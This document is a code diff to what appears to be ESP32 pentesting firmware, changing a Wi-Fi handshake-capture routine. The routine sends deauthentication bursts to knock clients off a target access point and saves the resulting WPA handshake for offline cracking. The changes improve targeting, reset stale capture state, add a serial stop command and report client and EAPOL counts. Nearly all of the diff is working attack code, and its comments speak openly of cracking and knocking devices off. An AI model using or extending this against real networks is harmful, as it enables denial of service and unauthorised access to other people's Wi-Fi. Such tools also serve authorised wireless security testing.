@@ -391,26 +391,32 @@ ScanNets:
 
 uint8_t targetBssid[6];
 #if !defined(LITE_VERSION)
-void capture_handshake(const String &tssid, const String &mac, uint8_t channel) {
+void capture_handshake(const String &tssid, const String &mac, uint8_t channel, bool returnAfterSave) {
     cleanlyStopWebUiForWiFiFeature();
 
     hsTracker = HandshakeTracker();
 
     uint8_t bssid_array[6];
-    sscanf(
-        mac.c_str(),
-        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-        &bssid_array[0],
-        &bssid_array[1],
-        &bssid_array[2],
-        &bssid_array[3],
-        &bssid_array[4],
-        &bssid_array[5]
-    );
+    // A malformed address must not be broadcast: sscanf would leave this
+    // uninitialised and the deauth would go out to whatever the stack held.
+    if (sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid_array[0], &bssid_array[1],
+               &bssid_array[2], &bssid_array[3], &bssid_array[4], &bssid_array[5]) != 6) {
+        Serial.printf("capture_handshake: bad BSSID '%s'\n", mac.c_str());
+        return;
+    }
 
     memcpy(ap_record.bssid, bssid_array, 6);
     memcpy(targetBssid, bssid_array, 6);
     ap_record.primary = channel;
+
+    // ap_record is global and gets rewritten both by the on-screen scan menu
+    // and by every beacon that arrives while capturing, so building the deauth
+    // from it aims at whatever the board happened to see last -- the network
+    // saved in its settings, for instance -- instead of the requested one.
+    // This record is built from the request alone and nothing else touches it.
+    wifi_ap_record_t requested = {};
+    memcpy(requested.bssid, bssid_array, 6);
+    requested.primary = channel;
 
     String encryptionTypeStr = "Unknown";
     for (int i = 0; i < ap_records.size(); i++) {
@@ -483,6 +489,15 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
 
     wifi_complete_cleanup();
 
+    // Old per-AP flags must not make a new command report an earlier capture.
+    sniffer_wait_for_flush(2000);
+    sniffer_reset_handshake_cache();
+    uint64_t captureKey = 0;
+    for (uint8_t value : bssid_array) { captureKey = (captureKey << 8) | value; }
+    // The device tally must describe this run, not an earlier one: otherwise a
+    // capture that found nobody reports the count left over from the last.
+    resetStationsForAp(captureKey);
+
     if (!WiFi.mode(WIFI_MODE_APSTA)) {
         displayError("Failed starting WIFI", true);
         return;
@@ -513,9 +528,12 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
     enum { SCANNING, MONITORING, CAPTURED } phase = SCANNING;
 
     bool needRedraw = true;
+    bool stopRequested = false;
+    char stopWord[8] = {0};
+    size_t stopLen = 0;
 
     auto sendDeauthBurst = [&]() {
-        wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
+        wsl_bypasser_send_raw_frame(&requested, channel, _default_target);
         for (int i = 0; i < 5; i++) {
             send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
             vTaskDelay(10 / portTICK_PERIOD_MS);
@@ -543,15 +561,52 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
             needRedraw = true;
         }
 
-        if (handshakeUsable(hsTracker)) {
+        // The writer marks readiness after closing the PCAP, rather than when
+        // the radio has merely observed four messages waiting in its queue.
+        if (sniffer_is_handshake_ready(captureKey)) {
             phase = CAPTURED;
+            if (returnAfterSave) {
+                Serial.println("capture file ready: returning to console");
+                break;
+            }
         } else if (hsTracker.msg1 && phase == SCANNING) {
             phase = MONITORING;
+        }
+
+        // The command parser is busy for as long as this loop runs, so a stop
+        // request cannot arrive as a command. It arrives as this token on the
+        // same line and is noticed here. The whole word has to match: the board
+        // echoes what it is given, so a single letter would fire on any SSID
+        // that happens to contain it and end the capture on the first pass.
+        if (Serial.available()) {
+            char ch = (char)Serial.read();
+            if (ch == '\n' || ch == '\r') {
+                if (stopLen == 6 && memcmp(stopWord, "brkcap", 6) == 0) stopRequested = true;
+                stopLen = 0;
+            } else if (stopLen < sizeof(stopWord)) {
+                stopWord[stopLen++] = ch;
+            }
+        }
+        if (stopRequested) {
+            Serial.println("capture stopped by host");
+            break;
+        }
+        if (check(EscPress)) {
+            Serial.println("capture ended: EscPress");
+            break;
         }
 
         if (phase != CAPTURED && millis() - countdownTick >= 3000) {
             needRedraw = true;
             countdownTick = millis();
+            // What the host needs to tell the user whether this capture is worth
+            // anything: how many devices have been heard on this network, and how
+            // many handshake messages have arrived. Without it, "no handshake" and
+            // "no devices to knock over" are the same silence from the other end
+            // of the serial cable.
+            uint8_t stations = stationCountForAp(captureKey);
+            Serial.printf("clients=%u eapol=%u msg1=%d\n", stations, num_EAPOL,
+                          hsTracker.msg1 ? 1 : 0);
         }
 
         if (needRedraw) {
@@ -594,12 +649,18 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
                 tft.print(" 3");
                 tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                 tft.print(" 4");
-                if (hsTracker.msg1 && hsTracker.msg2 && hsTracker.msg3 && hsTracker.msg4) {
+                if (hsTracker.msg1 && hsTracker.msg2 && hsTracker.msg3) {
+                    // M4 is not required: the capture is written to the card as
+                    // soon as M1+M2+M3 are in, which is the pair a cracker
+                    // verifies. Waiting for M4 here showed a green CAPTURED
+                    // above a red "MSG 4: None" on most successful captures.
                     tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-                    tft.println(" > All Captured");
+                    tft.println(" > Usable (M1-M3)");
                 } else tft.println("");
             }
 
+            padprint("Clients heard: " + String(stationCountForAp(captureKey)));
+            padprintln("");
             padprint("Deauth sent: " + String(deauthCount));
             if (phase != CAPTURED) {
                 unsigned long remaining = deauthInterval() - (millis() - autoDeauthTimer);
@@ -625,7 +686,10 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
             if (millis() - autoDeauthTimer >= deauthInterval()) { sendDeauthBurst(); }
         }
 
-        if (check(EscPress)) { break; }
+        if (check(EscPress)) {
+            Serial.println("capture ended: EscPress");
+            break;
+        }
 
         vTaskDelay(50 / portTICK_PERIOD_MS);
     }
@@ -634,6 +698,8 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
     esp_wifi_set_promiscuous_rx_cb(NULL);
     esp_wifi_stop();
     delay(100);
+    Serial.printf("capture finished: msg1=%d msg2=%d msg3=%d msg4=%d deauths=%d\n",
+                  hsTracker.msg1, hsTracker.msg2, hsTracker.msg3, hsTracker.msg4, deauthCount);
     returnToMenu = true;
 }
 #endif
